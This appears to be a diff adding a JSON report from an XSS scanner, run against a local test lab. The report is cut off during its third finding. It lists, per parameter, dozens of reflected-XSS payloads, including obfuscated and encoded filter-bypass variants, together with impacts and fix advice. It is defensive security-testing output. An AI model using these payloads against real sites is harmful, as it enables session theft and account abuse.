@@ -1,0 +1,1554 @@
+{
+  "scanner": "s2n-xss",
+  "version": "2.1-improved",
+  "report_format": "grouped",
+  "scan_summary": {
+    "unique_vulnerabilities": 4,
+    "total_payloads_tested": 181,
+    "successful_payloads": 180,
+    "success_rate": "99.4%",
+    "severity_breakdown": {
+      "CRITICAL": 0,
+      "HIGH": 4,
+      "MEDIUM": 0,
+      "LOW": 0
+    },
+    "xss_type_breakdown": {
+      "Reflected XSS": 4
+    },
+    "payload_category_breakdown": {
+      "기본 스크립트 태그": 44,
+      "이벤트 핸들러": 92,
+      "기타": 12,
+      "난독화": 8,
+      "인코딩 우회": 24
+    }
+  },
+  "vulnerabilities": [
+    {
+      "vulnerability_id": "XSS-001",
+      "scanner": "s2n-xss",
+      "version": "2.1-improved",
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "vulnerability_type_ko": "크로스 사이트 스크립팅 (XSS)",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "xss_type": "Reflected XSS",
+      "location": {
+        "url": "http://localhost:8081/vulnerabilities/xss_s/",
+        "parameter": "txtName",
+        "method": "POST"
+      },
+      "payload_summary": {
+        "total_successful": 45,
+        "categories": [
+          "기본 스크립트 태그",
+          "이벤트 핸들러",
+          "기타",
+          "난독화",
+          "인코딩 우회"
+        ],
+        "first_detected": "2025-11-04 17:56:34"
+      },
+      "payloads_by_category": {
+        "기본 스크립트 태그": [
+          {
+            "payload": "<script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert(1)</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('한글XSS')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>console.log('UTF-8테스트:가나다')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<!--<script>alert('s2n-xss')</script>-->",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script><!--alert('s2n-xss')//--></script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('EUC-KR테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "'><script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          }
+        ],
+        "이벤트 핸들러": [
+          {
+            "payload": "<img src=x onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<body onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<input onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<select onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<textarea onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<details open ontoggle=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img src=x onerror=alert('한글')>",
+            "context": "korean_euc_kr",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('전각')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onload=\"alert('s2n-xss')\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img/src=x/onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg/onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onload='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onfocus='alert(\"s2n-xss\")' autofocus='",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onclick='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onload=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onclick=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onfocus=alert('s2n-xss') autofocus",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜svg onload=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          }
+        ],
+        "기타": [
+          {
+            "payload": "<iframe src=javascript:alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('전각문자')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('fullwidth')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          }
+        ],
+        "난독화": [
+          {
+            "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          },
+          {
+            "payload": "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          }
+        ],
+        "인코딩 우회": [
+          {
+            "payload": "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          }
+        ]
+      },
+      "all_payloads": [
+        "<script>alert('s2n-xss')</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('s2n-xss')>",
+        "<svg onload=alert('s2n-xss')>",
+        "<body onload=alert('s2n-xss')>",
+        "<iframe src=javascript:alert('s2n-xss')>",
+        "<input onfocus=alert('s2n-xss') autofocus>",
+        "<select onfocus=alert('s2n-xss') autofocus>",
+        "<textarea onfocus=alert('s2n-xss') autofocus>",
+        "<details open ontoggle=alert('s2n-xss')>",
+        "<script>alert('테스트')</script>",
+        "<script>alert('한글XSS')</script>",
+        "<img src=x onerror=alert('한글')>",
+        "＜script＞alert('전각문자')＜/script＞",
+        "＜img src=x onerror=alert('전각')＞",
+        "<script>console.log('UTF-8테스트:가나다')</script>",
+        "\" onload=\"alert('s2n-xss')\"",
+        "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+        "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+        "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+        "<img/src=x/onerror=alert('s2n-xss')>",
+        "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+        "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+        "<svg/onload=alert('s2n-xss')>",
+        "<!--<script>alert('s2n-xss')</script>-->",
+        "<script><!--alert('s2n-xss')//--></script>",
+        "<script>alert('EUC-KR테스트')</script>",
+        "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+        "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+        "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+        "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+        "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+        "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+        "' onload='alert(\"s2n-xss\")'",
+        "' onfocus='alert(\"s2n-xss\")' autofocus='",
+        "' onclick='alert(\"s2n-xss\")'",
+        "'><script>alert('s2n-xss')</script>",
+        "onload=alert('s2n-xss')",
+        "onclick=alert('s2n-xss')",
+        "onfocus=alert('s2n-xss') autofocus",
+        "＜script＞alert('fullwidth')＜/script＞",
+        "＜img src=x onerror=alert('fullwidth')＞",
+        "＜svg onload=alert('fullwidth')＞"
+      ],
+      "description": {
+        "korean": "'txtName' 파라미터에서 XSS 취약점이 발견되었습니다. 45개의 서로 다른 페이로드가 모두 성공했으며, 이는 입력 검증이 전혀 없음을 의미합니다.",
+        "english": "XSS vulnerability found in parameter 'txtName'. All 45 different payloads succeeded, indicating no input validation."
+      },
+      "impact": {
+        "korean": [
+          "사용자 세션 쿠키 탈취",
+          "사용자 계정 권한으로 악의적 행위 수행",
+          "피싱 페이지로 리다이렉트",
+          "사용자 입력 정보 탈취"
+        ],
+        "english": [
+          "Session cookie theft",
+          "Unauthorized actions with user privileges",
+          "Redirection to phishing pages",
+          "User input data exfiltration"
+        ]
+      },
+      "fix_recommendation": {
+        "priority": "CRITICAL",
+        "estimated_fix_time": "30 minutes",
+        "complexity": "LOW",
+        "summary": {
+          "korean": "모든 사용자 입력값을 출력하기 전 HTML 이스케이프 처리가 필요합니다. 또한 Content Security Policy (CSP) 헤더를 설정하여 XSS 공격을 방어하세요.",
+          "english": "All user inputs must be HTML-escaped before output. Additionally, implement Content Security Policy (CSP) headers."
+        },
+        "step_by_step": [
+          {
+            "step": 1,
+            "action": "취약한 코드 찾기",
+            "details": "파라미터 'txtName'를 처리하는 코드 위치 확인"
+          },
+          {
+            "step": 2,
+            "action": "HTML 이스케이프 적용",
+            "details": "출력 전 특수문자(<, >, \", ', &) 이스케이프 처리"
+          },
+          {
+            "step": 3,
+            "action": "CSP 헤더 설정",
+            "details": "Content-Security-Policy 헤더로 인라인 스크립트 차단"
+          },
+          {
+            "step": 4,
+            "action": "테스트 및 검증",
+            "details": "URL: http://localhost:8081/vulnerabilities/xss_s/?txtName=<script>alert(1)</script> 테스트"
+          }
+        ],
+        "code_examples": {
+          "php": {
+            "vulnerable": "echo $_GET['txtName'];  // VULNERABLE",
+            "fixed": "echo htmlspecialchars($_GET['txtName'], ENT_QUOTES, 'UTF-8');  // SECURE"
+          },
+          "python": {
+            "vulnerable": "return user_input  # VULNERABLE",
+            "fixed": "from html import escape\nreturn escape(user_input)  # SECURE"
+          },
+          "javascript": {
+            "vulnerable": "element.innerHTML = userInput;  // VULNERABLE",
+            "fixed": "element.textContent = userInput;  // SECURE"
+          },
+          "csp_header": "Content-Security-Policy: default-src 'self'; script-src 'self'"
+        }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://portswigger.net/web-security/cross-site-scripting",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "https://developer.mozilla.org/ko/docs/Web/Security/Types_of_attacks#%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%82%AC%EC%9D%B4%ED%8A%B8_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_xss"
+      ]
+    },
+    {
+      "vulnerability_id": "XSS-002",
+      "scanner": "s2n-xss",
+      "version": "2.1-improved",
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "vulnerability_type_ko": "크로스 사이트 스크립팅 (XSS)",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "xss_type": "Reflected XSS",
+      "location": {
+        "url": "http://localhost:8081/vulnerabilities/xss_s/",
+        "parameter": "mtxMessage",
+        "method": "POST"
+      },
+      "payload_summary": {
+        "total_successful": 45,
+        "categories": [
+          "기본 스크립트 태그",
+          "이벤트 핸들러",
+          "기타",
+          "난독화",
+          "인코딩 우회"
+        ],
+        "first_detected": "2025-11-04 17:56:35"
+      },
+      "payloads_by_category": {
+        "기본 스크립트 태그": [
+          {
+            "payload": "<script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert(1)</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('한글XSS')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>console.log('UTF-8테스트:가나다')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<!--<script>alert('s2n-xss')</script>-->",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script><!--alert('s2n-xss')//--></script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('EUC-KR테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "'><script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          }
+        ],
+        "이벤트 핸들러": [
+          {
+            "payload": "<img src=x onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<body onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<input onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<select onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<textarea onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<details open ontoggle=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img src=x onerror=alert('한글')>",
+            "context": "korean_euc_kr",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('전각')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onload=\"alert('s2n-xss')\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img/src=x/onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg/onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onload='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onfocus='alert(\"s2n-xss\")' autofocus='",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onclick='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onload=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onclick=alert('s2n-xss')",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "onfocus=alert('s2n-xss') autofocus",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜svg onload=alert('fullwidth')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          }
+        ],
+        "기타": [
+          {
+            "payload": "<iframe src=javascript:alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('전각문자')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          },
+          {
+            "payload": "＜script＞alert('fullwidth')＜/script＞",
+            "context": "javascript",
+            "description": "Other XSS technique"
+          }
+        ],
+        "난독화": [
+          {
+            "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          },
+          {
+            "payload": "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+            "context": "javascript",
+            "description": "Obfuscated JavaScript code"
+          }
+        ],
+        "인코딩 우회": [
+          {
+            "payload": "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          },
+          {
+            "payload": "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+            "context": "javascript",
+            "description": "Encoded payload to bypass filters"
+          }
+        ]
+      },
+      "all_payloads": [
+        "<script>alert('s2n-xss')</script>",
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert('s2n-xss')>",
+        "<svg onload=alert('s2n-xss')>",
+        "<body onload=alert('s2n-xss')>",
+        "<iframe src=javascript:alert('s2n-xss')>",
+        "<input onfocus=alert('s2n-xss') autofocus>",
+        "<select onfocus=alert('s2n-xss') autofocus>",
+        "<textarea onfocus=alert('s2n-xss') autofocus>",
+        "<details open ontoggle=alert('s2n-xss')>",
+        "<script>alert('테스트')</script>",
+        "<script>alert('한글XSS')</script>",
+        "<img src=x onerror=alert('한글')>",
+        "＜script＞alert('전각문자')＜/script＞",
+        "＜img src=x onerror=alert('전각')＞",
+        "<script>console.log('UTF-8테스트:가나다')</script>",
+        "\" onload=\"alert('s2n-xss')\"",
+        "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+        "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,115,50,110,45,120,115,115,39,41))</script>",
+        "<script>eval(atob('YWxlcnQoJ3Mybi14c3MnKQ=='))</script>",
+        "<img/src=x/onerror=alert('s2n-xss')>",
+        "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+        "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+        "<svg/onload=alert('s2n-xss')>",
+        "<!--<script>alert('s2n-xss')</script>-->",
+        "<script><!--alert('s2n-xss')//--></script>",
+        "<script>alert('EUC-KR테스트')</script>",
+        "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+        "%3Cscript%3Ealert('s2n-xss')%3C/script%3E",
+        "\\u003cscript\\u003ealert('s2n-xss')\\u003c/script\\u003e",
+        "\\x3cscript\\x3ealert('s2n-xss')\\x3c/script\\x3e",
+        "&lt;script&gt;alert('s2n-xss')&lt;/script&gt;",
+        "&#60;script&#62;alert('s2n-xss')&#60;/script&#62;",
+        "&#x3c;script&#x3e;alert('s2n-xss')&#x3c;/script&#x3e;",
+        "' onload='alert(\"s2n-xss\")'",
+        "' onfocus='alert(\"s2n-xss\")' autofocus='",
+        "' onclick='alert(\"s2n-xss\")'",
+        "'><script>alert('s2n-xss')</script>",
+        "onload=alert('s2n-xss')",
+        "onclick=alert('s2n-xss')",
+        "onfocus=alert('s2n-xss') autofocus",
+        "＜script＞alert('fullwidth')＜/script＞",
+        "＜img src=x onerror=alert('fullwidth')＞",
+        "＜svg onload=alert('fullwidth')＞"
+      ],
+      "description": {
+        "korean": "'mtxMessage' 파라미터에서 XSS 취약점이 발견되었습니다. 45개의 서로 다른 페이로드가 모두 성공했으며, 이는 입력 검증이 전혀 없음을 의미합니다.",
+        "english": "XSS vulnerability found in parameter 'mtxMessage'. All 45 different payloads succeeded, indicating no input validation."
+      },
+      "impact": {
+        "korean": [
+          "사용자 세션 쿠키 탈취",
+          "사용자 계정 권한으로 악의적 행위 수행",
+          "피싱 페이지로 리다이렉트",
+          "사용자 입력 정보 탈취"
+        ],
+        "english": [
+          "Session cookie theft",
+          "Unauthorized actions with user privileges",
+          "Redirection to phishing pages",
+          "User input data exfiltration"
+        ]
+      },
+      "fix_recommendation": {
+        "priority": "CRITICAL",
+        "estimated_fix_time": "30 minutes",
+        "complexity": "LOW",
+        "summary": {
+          "korean": "모든 사용자 입력값을 출력하기 전 HTML 이스케이프 처리가 필요합니다. 또한 Content Security Policy (CSP) 헤더를 설정하여 XSS 공격을 방어하세요.",
+          "english": "All user inputs must be HTML-escaped before output. Additionally, implement Content Security Policy (CSP) headers."
+        },
+        "step_by_step": [
+          {
+            "step": 1,
+            "action": "취약한 코드 찾기",
+            "details": "파라미터 'mtxMessage'를 처리하는 코드 위치 확인"
+          },
+          {
+            "step": 2,
+            "action": "HTML 이스케이프 적용",
+            "details": "출력 전 특수문자(<, >, \", ', &) 이스케이프 처리"
+          },
+          {
+            "step": 3,
+            "action": "CSP 헤더 설정",
+            "details": "Content-Security-Policy 헤더로 인라인 스크립트 차단"
+          },
+          {
+            "step": 4,
+            "action": "테스트 및 검증",
+            "details": "URL: http://localhost:8081/vulnerabilities/xss_s/?mtxMessage=<script>alert(1)</script> 테스트"
+          }
+        ],
+        "code_examples": {
+          "php": {
+            "vulnerable": "echo $_GET['mtxMessage'];  // VULNERABLE",
+            "fixed": "echo htmlspecialchars($_GET['mtxMessage'], ENT_QUOTES, 'UTF-8');  // SECURE"
+          },
+          "python": {
+            "vulnerable": "return user_input  # VULNERABLE",
+            "fixed": "from html import escape\nreturn escape(user_input)  # SECURE"
+          },
+          "javascript": {
+            "vulnerable": "element.innerHTML = userInput;  // VULNERABLE",
+            "fixed": "element.textContent = userInput;  // SECURE"
+          },
+          "csp_header": "Content-Security-Policy: default-src 'self'; script-src 'self'"
+        }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/",
+        "https://portswigger.net/web-security/cross-site-scripting",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "https://developer.mozilla.org/ko/docs/Web/Security/Types_of_attacks#%ED%81%AC%EB%A1%9C%EC%8A%A4_%EC%82%AC%EC%9D%B4%ED%8A%B8_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_xss"
+      ]
+    },
+    {
+      "vulnerability_id": "XSS-003",
+      "scanner": "s2n-xss",
+      "version": "2.1-improved",
+      "vulnerability_type": "Cross-Site Scripting (XSS)",
+      "vulnerability_type_ko": "크로스 사이트 스크립팅 (XSS)",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "xss_type": "Reflected XSS",
+      "location": {
+        "url": "http://localhost:8081/vulnerabilities/xss_s/",
+        "parameter": "btnSign",
+        "method": "POST"
+      },
+      "payload_summary": {
+        "total_successful": 45,
+        "categories": [
+          "기본 스크립트 태그",
+          "이벤트 핸들러",
+          "기타",
+          "난독화",
+          "인코딩 우회"
+        ],
+        "first_detected": "2025-11-04 17:56:35"
+      },
+      "payloads_by_category": {
+        "기본 스크립트 태그": [
+          {
+            "payload": "<script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert(1)</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('한글XSS')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>console.log('UTF-8테스트:가나다')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<ScRiPt>alert('s2n-xss')</sCrIpT>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<!--<script>alert('s2n-xss')</script>-->",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script><!--alert('s2n-xss')//--></script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "<script>alert('EUC-KR테스트')</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "%C5%D7%BD%BA%C6%AE<script>alert(1)</script>",
+            "context": "korean_euc_kr",
+            "description": "Standard <script> tag injection"
+          },
+          {
+            "payload": "'><script>alert('s2n-xss')</script>",
+            "context": "javascript",
+            "description": "Standard <script> tag injection"
+          }
+        ],
+        "이벤트 핸들러": [
+          {
+            "payload": "<img src=x onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<body onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<input onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<select onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<textarea onfocus=alert('s2n-xss') autofocus>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<details open ontoggle=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img src=x onerror=alert('한글')>",
+            "context": "korean_euc_kr",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "＜img src=x onerror=alert('전각')＞",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onload=\"alert('s2n-xss')\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "\" onfocus=\"alert('s2n-xss')\" autofocus=\"",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img/src=x/onerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\tsrc=x\tonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<img\nsrc=x\nonerror=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "<svg/onload=alert('s2n-xss')>",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
+          {
+            "payload": "' onload='alert(\"s2n-xss\")'",
+            "context": "javascript",
+            "description": "HTML event handler exploitation"
+          },
